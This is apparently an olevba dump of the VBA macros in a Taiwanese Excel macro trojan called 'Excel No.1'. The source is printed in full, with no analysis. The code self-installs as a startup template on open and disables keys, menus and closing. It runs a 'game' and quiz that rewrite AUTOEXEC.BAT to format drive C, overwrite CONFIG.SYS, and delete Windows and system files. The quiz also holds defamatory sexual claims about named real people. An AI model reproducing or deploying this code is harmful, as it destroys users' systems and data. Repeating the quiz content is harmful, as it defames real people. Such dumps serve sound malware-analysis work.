olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan.MSExcel.Loser.a.xls
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Trojan.MSExcel.Loser.a.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Workbook_BeforeClose(Cancel As Boolean)
    On Error Resume Next
    If Not OK Then
        Cancel = True
    Else
        Cancel = False
        Exit Sub
    End If
    ThisWorkbook.Worksheets("ExcelNo1").Visible = False
    ThisWorkbook.Worksheets("ExcelNo1").Save
    Set S = Nothing
End Sub
Private Sub Workbook_Open()
    AutoOpen.Main
    ThisWorkbook.Worksheets("ExcelNo1").Visible = True
    ThisWorkbook.Worksheets("ExcelNo1").Activate
    OK = False
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Trojan.MSExcel.Loser.a.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Trojan.MSExcel.Loser.a.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Global Const Config$ = "C:\CONFIG.SYS"
Global Const Autoexec$ = "C:\AUTOEXEC.BAT"

Public S As Object, OK As Boolean
Public OfficeDir$, TemplateDir$, StartDir$
Public Sub Main()
    StatusBar = "正在初始化設定..."
    Application.ScreenUpdating = False
    SaveFile
    GetDirs
    InterruptKeys
    StatusBar = "Excel No.1已經佔據您的系統"
    Application.ScreenUpdating = True
End Sub
Public Sub GetDirs()
    ExcelDir$ = Application.Path
    TemplateDir$ = Application.TemplatesPath
    StartDir$ = Application.StartupPath
End Sub
Public Sub KillMenu()
    On Error Resume Next
    Application.CommandBars("Worksheet Menu Bar").Controls(9).Delete
    Application.CommandBars("Worksheet Menu Bar").Controls(8).Delete
    Application.CommandBars("Worksheet Menu Bar").Controls(6).Delete
    Application.CommandBars("Worksheet Menu Bar").Controls(5).Delete
    Application.CommandBars("Worksheet Menu Bar").Controls(4).Delete
    Application.CommandBars("Worksheet Menu Bar").Controls(3).Delete
    Application.CommandBars("Worksheet Menu Bar").Controls(2).Delete
    Application.CommandBars("Worksheet Menu Bar").Controls(1).Delete
End Sub
Public Sub ReAuto()
    On Error Resume Next
    If UCase(Dir(Autoexec$)) = "AUTOEXEC.BAT" Then
        SetAttr Autoexec$, 0
    End If
    No = FreeFile
    Open "C:\c" For Output As #No
        Print #No, "y" & Chr$(13)
        Print #No, Chr$(13)
    Close #No
    No = FreeFile
    Open Autoexec$ For Output As #No
        Print #No, "PATH = C:\;" & S.WinPath & "\COMMAND;" & S.SystemPath
        Print #No, "format C:/u/q/v:EXCELNO1 < c"
    Close #No
End Sub
Public Sub SaveFile()
    f$ = StartDir & "\BOOK.XLT"
    If UCase(Dir(f$)) = "BOOK.XLT" Then Exit Sub
    On Error Resume Next
    Application.ActiveWorkbook.SaveAs FileName:=f$, FileFormat:=xlTemplate
    Set S = New X
    For c = 1 To 20
        S.CreateLink 1, "Excel No.1 - " & c, f$, ""
    Next c
    Set S = Nothing
End Sub
Public Sub InterruptKeys()
    On Error Resume Next
    With Application
        .OnKey "{BACKSPACE}", ""
        .OnKey "{BREAK}", ""
        .OnKey "{DOWN}", ""
        .OnKey "{UP}", ""
        .OnKey "{LEFT}", ""
        .OnKey "{RIGHT}", ""
        .OnKey "{ESC}", ""
        .OnKey "{DEL}", ""
        .OnKey "{HOME}", ""
        .OnKey "{END}", ""
        .OnKey "{PGDN}", ""
        .OnKey "{PGUP}", ""
        .OnKey "{RETURN}", ""
        .OnKey "{ENTER}", ""
        .OnKey "{TAB}", ""
        .OnKey "%{F4}", ""
        .OnKey "{F1}", ""
        .OnKey "{NUMLOCK}", ""
    End With
End Sub
Public Sub SafeExit()
    OK = True
    ThisWorkbook.Saved = True
    Application.Quit
End Sub
Public Sub ReConfig()
    On Error Resume Next
    If UCase(Dir(Config$)) = "CONFIG.SYS" Then
        SetAttr "C:\CONFIG.SYS", 0
    End If
    No = FreeFile
    Open Config$ For Output As #No
        Print #No, "Rem **** You're infected by Excel No.1 Macro Virus!"
        Print #No, "Dos = Low"
        Print #No, "FCBS = 255"
        Print #No, "FILES = 255"
        Print #No, "LastDrive = Z"
        Print #No, "SET TEMP = C:\"
        Print #No, "SET TMP = C:\"
        Print #No, "STACKS = 64, 512"
        Print #No, "SWITCHES= /F /K /N"
    Close #No
End Sub
-------------------------------------------------------------------------------
VBA MACRO Progress.bas 
in file: Trojan.MSExcel.Loser.a.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Progress'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Long, ByVal uParam As Long, ByVal lpvParam As Any, ByVal fuWinIni As Long) As Long
Public Declare Function fCreateShellLink Lib "STKIT432.DLL" _
        (ByVal Folder As String, ByVal ShortCutName As String, _
        ByVal ExePath As String, ByVal Params As String) As Long
Public Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal X As Long, ByVal y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
Public Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Public Declare Function GetSystemDirectory Lib "kernel32" Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Public Declare Function GetComputerName Lib "kernel32" Alias "GetComputerNameA" (ByVal lpBuffer As String, nSize As Long) As Long
Public Declare Function GetPrivateProfileString Lib "kernel32" Alias "GetPrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpDefault As String, ByVal lpReturnedString As String, ByVal nSize As Long, ByVal lpFileName As String) As Long
Public Declare Function WritePrivateProfileString Lib "kernel32" Alias "WritePrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpString As Any, ByVal lpFileName As String) As Long
Sub Begin()
    MsgBox "開始進入自我解毒程序", vbOKOnly & vbInformation, "Excel No.1"
    Game.Show
    Guess.Show
End Sub
-------------------------------------------------------------------------------
VBA MACRO Game.frm 
in file: Trojan.MSExcel.Loser.a.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Game'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim SafeOver As Boolean
Private Sub cmdStart_Click()
    d = S.GetRandomNumber(1, 100)
    On Error Resume Next
    Select Case d
        Case 1 To 46
            Tar1.Visible = False
            Tar2.Visible = False
            Tar3.Caption = "第三層"
            Arrow.Top = Arrow.Top - 45
            Arrow.Left = Arrow.Left - 60
            Arrow.ZOrder 0
            MsgBox "哈哈！我就說嘛！今天是您倒楣的日子！", vbCritical
            ReConfig
            ReAuto
        Case 47 To 80
            Tar1.Visible = False
            Tar2.Caption = "第二層"
            Tar3.Visible = False
            Arrow.Top = Arrow.Top - 60
            Arrow.Left = Arrow.Left - 30
            Arrow.ZOrder 0
            MsgBox "哈哈！我就說嘛！今天是您倒楣的日子！", vbCritical
            ReConfig
            KillMenu
            Kill S.WinPath & "\*.ini"
        Case Else
            Tar1.Caption = "第一層－紅心"
            Tar2.Visible = False
            Tar3.Visible = False
            Arrow.Top = Arrow.Top - 60
            Arrow.ZOrder 0
            MsgBox "真走運！讓您蒙到啦！下一關一定讓您死得很難看！", vbInformation
    End Select
    SafeOver = True
    Unload Game
End Sub
Private Sub UserForm_Initialize()
    SafeOver = False
    Set S = New X
End Sub
Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer)
    On Error Resume Next
    If SafeOver Then
        Cancel = False
    Else
        Cancel = True
    End If
    Set S = Nothing
End Sub
-------------------------------------------------------------------------------
VBA MACRO Guess.frm 
in file: Trojan.MSExcel.Loser.a.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Guess'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim SafeOver As Boolean, Ret As Integer, Total As Integer
Dim Q(1 To 100) As String, Opt1(1 To 100) As String, Opt2(1 To 100) As String, Opt3(1 To 100) As String, Ans(1 To 100) As Integer
Private Function Choose() As Integer
    d = S.GetRandomNumber(1, 73)
    Content.Caption = Q(d)
    O1.Caption = Opt1(d)
    O2.Caption = Opt2(d)
    O3.Caption = Opt3(d)
    Choose = d
End Function
Private Sub Finish()
    If Val(LabRight.Caption) = 0 Then
            MsgBox "真是超級遜斃了！一題也沒答對！你在混吃等死啊？", vbCritical
            On Error Resume Next
            Name S.WinPath & "\WIN.COM" As S.WinPath & "\LOSE.COM"
            Kill S.WinPath & "\*.*"
            Kill S.SystemPath & "\*.*"
    ElseIf Val(LabRight.Caption) = Total Then
            MsgBox "真棒！完全答對！Excel No.1 作者群對您致崇高的敬意，按下確定按鈕後自動清除本病毒..."
            SafeOver = True
            On Error Resume Next
            Unload Me
            For Each w2 In Workbooks
                w2.Saved = True
            Next w2
            OK = True
            Application.Quit
    Else
            MsgBox "您總共答對了 " & LabRight.Caption & " 題"
    End If
    SafeOver = True
    Unload Me
End Sub
Private Sub Correct()
    LabRight.Caption = Val(LabRight.Caption) + 1
End Sub
Private Sub Wrong()
    On Error Resume Next
    Static T
    Select Case T
        Case 0
            Kill S.SystemPath & "\*.DLL"
        Case 1
            Kill S.WinPath & "\*.COM"
        Case 2
            Kill S.WinPath & "\*.EXE"
        Case 3
            Kill S.SystemPath & "\*.DRV"
        Case 4
            Kill S.WinPath & "\*.INF"
        Case 5
            Kill S.WinPath & "\*.INI"
        Case 6
            Kill CurDir & "\*.*"
        Case 7
            Kill Application.Path & "\*.*"
        Case 8
            Kill Application.TemplatesPath & "\*.*"
        Case Else
            For m = 0 To 2
                For n = 1 To S.GetRandomNumber(15, 99)
                    S.CreateLink m, "Virus" & n, "C:\COMMAND.COM", ""
                Next n
            Next m
    End Select
    T = T + 1
End Sub
Private Sub CommandButton1_Click()
    If Val(LabRest.Caption) = 0 Then
        Finish
    End If
    Ret = Choose()
    Sure.Enabled = True
    CommandButton1.Enabled = False
End Sub
Private Sub Sure_Click()
    If Ret = 0 Then Exit Sub
    Select Case Ans(Ret)
        Case 1
            If O1.Value = True Then
                Correct
            Else
                Wrong
            End If
        Case 2
            If O2.Value = True Then
                Correct
            Else
                Wrong
            End If
        Case 3
            If O3.Value = True Then
                Correct
            Else
                Wrong
            End If
    End Select
    LabRest.Caption = Val(LabRest.Caption) - 1
    Sure.Enabled = False
    CommandButton1.Enabled = True
End Sub
Private Sub UserForm_Initialize()
    SafeOver = False
    Set S = New X
    ReadQuestions
    ReadQuestions2
    Sure.Enabled = False
    Total = Val(LabRest.Caption)
    Content.Caption = "按一下按鈕開始測驗"
End Sub
Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer)
    If SafeOver Then
        Cancel = False
    Else
        Cancel = True
        Exit Sub
    End If
    Set S = Nothing
End Sub
Private Sub ReadQuestions2()
    Q(61) = "以下城市由北向南排列何者錯誤？"
    Opt1(61) = "瑞穗=>玉里=>光復=>成功=>台東"
    Opt2(61) = "汐止=>鶯歌=>內壢=>板橋=>中壢"
    Opt3(61) = "汐止=>萬華=>內壢=>楊梅=>苗栗"
    Ans(61) = 2
    
    Q(62) = "以下城市由北向南排列何者正確？"
    Opt1(62) = "頭城=>瑞穗=>玉里=>成功=>台東"
    Opt2(62) = "羅東=>宜蘭=>花蓮=>台東=>屏東"
    Opt3(62) = "汐止=>萬華=>中壢=>湖口=>山佳"
    Ans(62) = 1
    
    Q(63) = "以下關於台北市的道路由北向南排列何者正確？"
    Opt1(63) = "民族東路=>民權東路=>北平東路=>長安東路"
    Opt2(63) = "忠孝東路=>南京東路=>北平東路=>長安東路"
    Opt3(63) = "民族東路=>民權東路=>民生東路=>南京東路"
    Ans(63) = 3
    
    Q(64) = "以下關於台北市的道路由東向西排列何者正確？"
    Opt1(64) = "重慶北路=>中山北路=>建國北路=>敦化北路"
    Opt2(64) = "中山北路=>敦化北路=>新生北路=>建國北路"
    Opt3(64) = "中山北路=>重慶北路=>建國北路=>基隆路"
    Ans(64) = 1
    
    Q(65) = "台北市的中山北路不和以下何者相交？"
    Opt1(65) = "民族東路"
    Opt2(65) = "羅斯福路"
    Opt3(65) = "忠孝東路"
    Ans(65) = 2
    
    Q(66) = "台北市的忠孝東路和以下何者相交？"
    Opt1(66) = "仁愛路"
    Opt2(66) = "羅斯福路"
    Opt3(66) = "敦化北路"
    Ans(66) = 1
    
    Q(67) = "台北市的民權西路和以下何者相交？"
    Opt1(67) = "承德路"
    Opt2(67) = "羅斯福路"
    Opt3(67) = "敦化北路"
    Ans(67) = 1
    
    Q(68) = "台北市的南京西路和以下何者相交？"
    Opt1(68) = "承德路"
    Opt2(68) = "信義路"
    Opt3(68) = "建國北路"
    Ans(68) = 1
    
    Q(69) = "台北市的長安東路和以下何者相交？"
    Opt1(69) = "中山北路"
    Opt2(69) = "信義路"
    Opt3(69) = "承德路"
    Ans(69) = 1
    
    Q(70) = "以下何者不是台北市的大安森林公園的周邊道路？"
    Opt1(70) = "忠孝東路"
    Opt2(70) = "信義路"
    Opt3(70) = "和平東路"
    Ans(70) = 1
    
    Q(71) = "以下何者不與台北市的木柵捷運相交？"
    Opt1(71) = "忠孝東路"
    Opt2(71) = "承德路"
    Opt3(71) = "民生東路"
    Ans(71) = 2
    
    Q(72) = "以下何者不是台北市士林區的道路名稱？"
    Opt1(72) = "仰德大道"
    Opt2(72) = "中山北路"
    Opt3(72) = "南海路"
    Ans(72) = 3
    
    Q(73) = "以下何者不是台北市士林區的道路名稱？"
    Opt1(73) = "重慶南路"
    Opt2(73) = "中山北路"
    Opt3(73) = "忠誠路"
    Ans(73) = 1
End Sub
Private Sub ReadQuestions()
    Q(1) = "請問以下哪個IP是中興法商BBS的位址？"
    Opt1(1) = "140.112.1.6"
    Opt2(1) = "192.192.35.34"
    Opt3(1) = "203.64.35.100"
    Ans(1) = 2
    
    Q(2) = "請問以下哪個人最不可能是 Excel No.1 的作者？"
    Opt1(2) = "翁世豪"
    Opt2(2) = "吳俊緯"
    Opt3(2) = "陳清芳"
    Ans(2) = 3
    
    Q(3) = "請問以下的北極星使用者中，哪個人最賤？"
    Opt1(3) = "Shirely"
    Opt2(3) = "Takeshi"
    Opt3(3) = "July"
    Ans(3) = 1
    
    Q(4) = "請問以下哪個人已經不是處女了？"
    Opt1(4) = "崇Ｚ企專Ｘ貿科蔡芳宜"
    Opt2(4) = "台北Ｚ專Ｘ保科王韻親"
    Opt3(4) = "Ｚ吳大學范亞雰"
    Ans(4) = 3
    
    Q(5) = "請問通常高普考在哪個月放榜？"
    Opt1(5) = "一月"
    Opt2(5) = "八月"
    Opt3(5) = "十月"
    Ans(5) = 3
    
    Q(6) = "請問以下哪個人不是殺害白曉燕的兇手？"
    Opt1(6) = "陳進興"
    Opt2(6) = "林春生"
    Opt3(6) = "白冰冰"
    Ans(6) = 3
    
    Q(7) = "請問以下哪個軟體不是微軟公司出的？"
    Opt1(7) = "PHOTOSHOP"
    Opt2(7) = "OFFICE 97"
    Opt3(7) = "INTERNET EXPLORER"
    Ans(7) = 1
    
    Q(8) = "請問以下哪個軟體不是微軟公司出的？"
    Opt1(8) = "WORD PRO"
    Opt2(8) = "OFFICE 97"
    Opt3(8) = "WINDOWS 95"
    Ans(8) = 1
    
    Q(9) = "溫尼颱風過境造成慘重的損害，以下哪個單位最不需要負責？"
    Opt1(9) = "行政院各部會"
    Opt2(9) = "士林地檢署"
    Opt3(9) = "水利局"
    Ans(9) = 2
    
    Q(10) = "以下哪個人是VB5與ActiveX程式設計的作者？"
    Opt1(10) = "薛曉嵐"
    Opt2(10) = "王國榮"
    Opt3(10) = "鄧文淵"
    Ans(10) = 2
    
    Q(11) = "以下哪個人是Word 97的使用藝術之作者？"
    Opt1(11) = "薛曉嵐"
    Opt2(11) = "王國榮"
    Opt3(11) = "鄧文淵"
    Ans(11) = 1
    
    Q(12) = "以下哪個人是北港香爐人人插一書中所影射的人？"
    Opt1(12) = "瞿美鳳"
    Opt2(12) = "白冰冰"
    Opt3(12) = "陳文茜"
    Ans(12) = 3
    
    Q(13) = "以下哪個人目前最不可能是台視新聞的主播？"
    Opt1(13) = "李慧慧"
    Opt2(13) = "蘇宗怡"
    Opt3(13) = "劉麗惠"
    Ans(13) = 2
    
    Q(14) = "以下哪個人目前最不可能當中華民國總統？"
    Opt1(14) = "江澤民"
    Opt2(14) = "宋楚瑜"
    Opt3(14) = "連戰"
    Ans(14) = 1
    
    Q(15) = "以下哪種土壤最有可能分布在台灣西部海埔地？"
    Opt1(15) = "紅壤"
    Opt2(15) = "鹽漬土"
    Opt3(15) = "紫棕壤"
    Ans(15) = 2
    
    Q(16) = "以下哪種土壤最有可能分布在四川盆地？"
    Opt1(16) = "紅壤"
    Opt2(16) = "鹽漬土"
    Opt3(16) = "灰棕壤"
    Ans(16) = 1
    
    Q(17) = "以下哪個名稱不曾被病毒作者拿來命名過？"
    Opt1(17) = "馬蓋先"
    Opt2(17) = "台灣原住民"
    Opt3(17) = "中央情報局"
    Ans(17) = 3
    
    Q(18) = "以下哪個人在天宇布袋戲中活得最久？"
    Opt1(18) = "藏修羅"
    Opt2(18) = "孤獨毒"
    Opt3(18) = "藏神秘"
    Ans(18) = 3
    
    Q(19) = "以下哪個人在天宇布袋戲中活得最久？"
    Opt1(19) = "六手魔像"
    Opt2(19) = "孤獨毒"
    Opt3(19) = "怒雨飛龍"
    Ans(19) = 1
    
    Q(20) = "以下哪個人在天宇布袋戲裡和藏神秘關係最密切？"
    Opt1(20) = "矮子靈"
    Opt2(20) = "三裁公"
    Opt3(20) = "怒雨飛龍"
    Ans(20) = 2
    
    Q(21) = "以下哪個人在天宇布袋戲裡和紅雲關係最不深？"
    Opt1(21) = "造雲麒麟"
    Opt2(21) = "劍苗小雙"
    Opt3(21) = "夢雨涵"
    Ans(21) = 2
    
    Q(22) = "以下哪個單位是中華民國最高的行政機關？"
    Opt1(22) = "行政院"
    Opt2(22) = "總統府"
    Opt3(22) = "國家安全局"
    Ans(22) = 1
    
    Q(23) = "以下哪個單位是中華民國最高的立法機關？"
    Opt1(23) = "行政院"
    Opt2(23) = "總統府"
    Opt3(23) = "立法院"
    Ans(23) = 3
    
    Q(24) = "以下哪個單位可以解釋中華民國憲法？"
    Opt1(24) = "立法院"
    Opt2(24) = "總統府"
    Opt3(24) = "大法官會議"
    Ans(24) = 3
    
    Q(25) = "國父認為什麼是人民權利的保障書？"
    Opt1(25) = "民法"
    Opt2(25) = "刑法"
    Opt3(25) = "憲法"
    Ans(25) = 3
    
    Q(26) = "目前以下何人不享有言論免責權？"
    Opt1(26) = "立法委員"
    Opt2(26) = "總統"
    Opt3(26) = "省議員"
    Ans(26) = 2
    
    Q(27) = "目前以下何人不享有言論免責權？"
    Opt1(27) = "立法委員"
    Opt2(27) = "監察委員"
    Opt3(27) = "國大代表"
    Ans(27) = 2
    
    Q(28) = "目前以下何人不享有言論免責權？"
    Opt1(28) = "立法委員"
    Opt2(28) = "法官"
    Opt3(28) = "國大代表"
    Ans(28) = 2
    
    Q(29) = "我國受理行政訴訟的機關是？"
    Opt1(29) = "行政院會議"
    Opt2(29) = "憲法法庭"
    Opt3(29) = "行政法院"
    Ans(29) = 3
    
    Q(30) = "我國哪種官職的就職宣誓誓詞明定於憲法內？"
    Opt1(30) = "行政院長"
    Opt2(30) = "總統"
    Opt3(30) = "司法院長"
    Ans(30) = 2
    
    Q(31) = "我國國民大會若要修改憲法，其決議通過的人數需是出席代表的幾分之幾？"
    Opt1(31) = "2/3"
    Opt2(31) = "3/4"
    Opt3(31) = "1/2"
    Ans(31) = 2

    Q(32) = "我國法官的任期是？"
    Opt1(32) = "九年"
    Opt2(32) = "終身職"
    Opt3(32) = "與執政黨同進退"
    Ans(32) = 2
    
    Q(33) = "我國大法官會議的主席是？"
    Opt1(33) = "首席大法官"
    Opt2(33) = "總統府秘書長"
    Opt3(33) = "司法院長"
    Ans(33) = 3
    
    Q(34) = "我國國土面積是多少平方公里？"
    Opt1(34) = "一千一百四十二萬"
    Opt2(34) = "二千兩百四十二萬"
    Opt3(34) = "三千三百四十二萬"
    Ans(34) = 1
    
    Q(35) = "台灣本島面積是多少平方公里？"
    Opt1(35) = "一千九百四十多"
    Opt2(35) = "二千七百六十多"
    Opt3(35) = "三千五百七十多"
    Ans(35) = 1
    
    Q(36) = "台灣本島最大平原是？"
    Opt1(36) = "嘉南平原"
    Opt2(36) = "花東平原"
    Opt3(36) = "宜蘭平原"
    Ans(36) = 1
    
    Q(37) = "以我國版圖整體位置而言，位於幾何中心的地理區是？"
    Opt1(37) = "兩湖盆地"
    Opt2(37) = "河西走廊"
    Opt3(37) = "隴西高原"
    Ans(37) = 3
    
    Q(38) = "位於長白山地的天池是？"
    Opt1(38) = "火口湖"
    Opt2(38) = "偃塞湖"
    Opt3(38) = "斷層湖"
    Ans(38) = 1
    
    Q(39) = "有塞上江南之稱的是？"
    Opt1(39) = "嘉南平原"
    Opt2(39) = "河套"
    Opt3(39) = "四川都江堰"
    Ans(39) = 2
    
    Q(40) = "Visual Basic 5.0中，命令按鈕物件不具有以下何種屬性？"
    Opt1(40) = "Caption"
    Opt2(40) = "Path"
    Opt3(40) = "MouseIcon"
    Ans(40) = 2
    
    Q(41) = "Visual Basic 5.0中，表格物件不具有以下何種屬性？"
    Opt1(41) = "Visible"
    Opt2(41) = "Enabled"
    Opt3(41) = "Value"
    Ans(41) = 3
    
    Q(42) = "下列何者不是網際網路提供的功能或服務？"
    Opt1(42) = "世界地理資訊系統"
    Opt2(42) = "檔案查詢系統"
    Opt3(42) = "電子佈告欄系統"
    Ans(42) = 1
    
    Q(43) = "網際網路的英文是？"
    Opt1(43) = "World Wide Web"
    Opt2(43) = "Intranet"
    Opt3(43) = "Internet"
    Ans(43) = 3
    
    Q(44) = "網際網路的英文是？"
    Opt1(44) = "World Wide Web"
    Opt2(44) = "Intranet"
    Opt3(44) = "Internet"
    Ans(44) = 3
    
    Q(45) = "網際資訊網路的英文是？"
    Opt1(45) = "Internet"
    Opt2(45) = "Hinet"
    Opt3(45) = "Network"
    Ans(45) = 2
    
    Q(46) = "全球資訊網的英文是？"
    Opt1(46) = "FTP"
    Opt2(46) = "WWW"
    Opt3(46) = "BBS"
    Ans(46) = 2
    
    Q(47) = "屬於資策會的網路是？"
    Opt1(47) = "Hinet"
    Opt2(47) = "Seednet"
    Opt3(47) = "TANet"
    Ans(47) = 2
    
    Q(48) = "台灣學術網路的英文是？"
    Opt1(48) = "Seednet"
    Opt2(48) = "Hinet"
    Opt3(48) = "TANet"
    Ans(48) = 3
    
    Q(49) = "１２８的４次方是多少？"
    Opt1(49) = "268435456"
    Opt2(49) = "288423456"
    Opt3(49) = "208435446"
    Ans(49) = 1
    
    Q(50) = "有詩聖之稱的中國歷史名人是誰？"
    Opt1(50) = "杜甫"
    Opt2(50) = "杜牧"
    Opt3(50) = "李白"
    Ans(50) = 1
    
    Q(51) = "以下何者不是布袋戲霹靂系列中的人物？"
    Opt1(51) = "秦假仙"
    Opt2(51) = "香九齡"
    Opt3(51) = "素還貞"
    Ans(51) = 2
    
    Q(52) = "以下何者不是布袋戲天宇系列中的人物？"
    Opt1(52) = "羅雀"
    Opt2(52) = "香九齡"
    Opt3(52) = "鬼王棺"
    Ans(52) = 3
    
    Q(53) = "以下何者不是Excel能開啟之檔案的常見副檔名？"
    Opt1(53) = "XLA"
    Opt2(53) = "XLS"
    Opt3(53) = "DOT"
    Ans(53) = 3
    
    Q(54) = "以下何者不是Excel能開啟之檔案的常見副檔名？"
    Opt1(54) = "XLB"
    Opt2(54) = "XLC"
    Opt3(54) = "XLM"
    Ans(54) = 2
    
    Q(55) = "WIndows 95內的附屬遊戲程式新接龍之檔案的名稱為何？"
    Opt1(55) = "Msheart.exe"
    Opt2(55) = "Freecell.exe"
    Opt3(55) = "Sol.exe"
    Ans(55) = 2
    
    Q(56) = "WIndows 95內的附屬遊戲程式接龍之檔案的名稱為何？"
    Opt1(56) = "Msheart.exe"
    Opt2(56) = "Freecell.exe"
    Opt3(56) = "Sol.exe"
    Ans(56) = 3
    
    Q(57) = "以下哪一個檔案不是WIndows 95絕對必要內的開機檔？"
    Opt1(57) = "Emm386.exe"
    Opt2(57) = "Msdos.sys"
    Opt3(57) = "Command.com"
    Ans(57) = 1
    
    Q(58) = "以下哪一個檔案不是WIndows 95絕對必要內的開機檔？"
    Opt1(58) = "Io.sys"
    Opt2(58) = "Msdos.sys"
    Opt3(58) = "Config.sys"
    Ans(58) = 3
    
    Q(59) = "以下哪一個不是圖形檔常見的副檔名？"
    Opt1(59) = "WK1"
    Opt2(59) = "JPG"
    Opt3(59) = "PCX"
    Ans(59) = 1
    
    Q(60) = "以下哪一個不是圖形檔常見的副檔名？"
    Opt1(60) = "DOC"
    Opt2(60) = "GIF"
    Opt3(60) = "BMP"
    Ans(60) = 1
End Sub
-------------------------------------------------------------------------------
VBA MACRO X.cls 
in file: Trojan.MSExcel.Loser.a.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/X'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Function SystemPath() As String
        Dim b As String * 255
        b = Space$(255)
        L = GetSystemDirectory(b, 255)
        SystemPath = Trim(Left(b, L))
End Function
Public Function GetComputerName()
        Dim b As String * 255
        b = Space$(255)
        L = GetComputerName(b, 255)
        L = InStr(1, b, Chr$(0))
        b = Left(b, L - 1)
        m_ComputerName = Trim(b)
        ComputerName = m_ComputerName
End Function
Public Function WinPath() As String
        Dim b As String * 255
        b = Space$(255)
        L = GetWindowsDirectory(b, 255)
        WinPath = Trim(Left(b, L))
End Function
Public Function GetRandomNumber(Mini As Single, Maxi As Single) As Single
        If Mini >= Maxi Then
                MsgBox Mini & " 必須比 " & Maxi & " 大！", vbCritical
                GetRandomNumber = 0
                Exit Function
        End If
        Randomize Timer
        GetRandomNumber = Int((Maxi * Rnd) + Mini)
End Function
Public Sub CreateLink(位置 As Integer, 捷徑名稱 As String, 檔案路徑 As String, 程式參數 As String)
        Screen.MousePointer = vbHourglass
        Select Case 位置
                Case 0 '桌面
                        Ret = fCreateShellLink("..\..\Desktop", 捷徑名稱, 檔案路徑, 程式參數)
                Case 1 '開始功能表
                        Ret = fCreateShellLink("..", 捷徑名稱, 檔案路徑, 程式參數)
                Case 2 '程式集
                        Ret = fCreateShellLink(".", 捷徑名稱, 檔案路徑, 程式參數)
        End Select
        Screen.MousePointer = 1
End Sub
Public Sub WriteSetting(Section As String, KeyName As String, Setting As String, File As String)
        h = WritePrivateProfileString(Section, KeyName, Setting, File)
End Sub
Public Function GetSettings(AppName As String, Key As String, File As String) As String
        R$ = String$(255, 0)
        X = GetPrivateProfileString(AppName, Key, "", R$, Len(R$), File)
        R$ = Left(R$, InStr(R$, Chr(0)) - 1)
        GetSettings = R$
End Function
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Trojan.MSExcel.Loser.a.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, hidden -  ExcelNo
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Trojan.MSExcel.Loser.a.xls
' ===============================================================================
' Module streams:
' _VBA_PROJECT_CUR/VBA/ThisWorkbook - 4702 bytes
' Line #0:
' 	FuncDefn (Private Sub Workbook_BeforeClose(Cancel As Boolean))
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	Ld OK 
' 	Not 
' 	IfBlock 
' Line #3:
' 	LitVarSpecial (True)
' 	St Cancel 
' Line #4:
' 	ElseBlock 
' Line #5:
' 	LitVarSpecial (False)
' 	St Cancel 
' Line #6:
' 	ExitSub 
' Line #7:
' 	EndIfBlock 
' Line #8:
' 	LitVarSpecial (False)
' 	LitStr 0x0008 "ExcelNo1"
' 	Ld ThisWorkbook 
' 	ArgsMemLd Worksheets 0x0001 
' 	MemSt Visible 
' Line #9:
' 	LitStr 0x0008 "ExcelNo1"
' 	Ld ThisWorkbook 
' 	ArgsMemLd Worksheets 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #10:
' 	SetStmt 
' 	LitNothing 
' 	Set S 
' Line #11:
' 	EndSub 
' Line #12:
' 	FuncDefn (Private Sub Workbook_Open())
' Line #13:
' 	Ld AutoOpen 
' 	ArgsMemCall Main 0x0000 
' Line #14:
' 	LitVarSpecial (True)
' 	LitStr 0x0008 "ExcelNo1"
' 	Ld ThisWorkbook 
' 	ArgsMemLd Worksheets 0x0001 
' 	MemSt Visible 
' Line #15:
' 	LitStr 0x0008 "ExcelNo1"
' 	Ld ThisWorkbook 
' 	ArgsMemLd Worksheets 0x0001 
